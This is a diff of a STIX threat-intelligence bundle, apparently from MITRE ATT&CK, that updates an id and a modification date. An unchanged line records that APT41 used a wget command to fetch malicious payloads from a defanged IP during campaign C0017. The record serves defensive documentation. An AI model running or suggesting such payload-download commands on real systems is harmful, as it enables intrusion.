@@ -1,6 +1,6 @@
 {
     "type": "bundle",
-    "id": "bundle--62d0f345-eb5f-4848-8420-62d8836a0c62",
+    "id": "bundle--b72c4e0e-01fe-4afe-a2ce-61f54fdc6749",
     "spec_version": "2.0",
     "objects": [
         {
@@ -19,7 +19,7 @@
             "object_marking_refs": [
                 "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
             ],
-            "modified": "2026-07-31T21:12:31.546Z",
+            "modified": "2026-09-03T19:47:00.955Z",
             "description": "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.(Citation: Mandiant APT41)\n",
             "relationship_type": "uses",
             "source_ref": "campaign--ba6dfa37-f401-4140-88b0-8938f2895e61",
